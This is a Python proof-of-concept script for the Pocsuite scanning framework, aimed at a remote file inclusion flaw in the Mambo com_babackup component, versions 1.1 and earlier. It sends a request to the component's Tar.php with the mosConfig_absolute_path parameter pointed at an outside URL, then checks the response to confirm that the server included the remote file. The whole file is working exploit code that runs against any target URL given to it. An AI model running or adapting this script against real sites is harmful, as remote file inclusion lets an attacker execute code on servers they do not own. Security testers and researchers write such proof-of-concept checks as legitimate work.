#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '63864'  # ssvid
    version = '1.0'
    author = ['皮皮']
    vulDate = '2006-08-22'
    createDate = '2015-12-24'
    updateDate = '2015-12-24'
    references = ['http://www.sebug.net/vuldb/ssvid-63864']
    name = 'mambo com_babackup Component &lt;= 1.1 File Include Vulnerability'
    appPowerLink = 'http://mamboxchange.com/frs/download.php/5072/com_babackup_1.1.zip'
    appName = 'mambo com_babackup Component'
    appVersion = '<= 1.1'
    vulType = 'Remote File Inclusion'
    desc = ''
    samples = ['']


    def _attack(self):
        return self._verify()


    def _verify(self):
        result = {}
        vul_url = '%s/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=http://baidu.com/robots.txt?' % self.url
        response = req.get(vul_url).content

        if 'Googlebot' in response and 'Baiduspider' in response:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url

        return self.parse_attack(result)


    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output

register(TestPOC)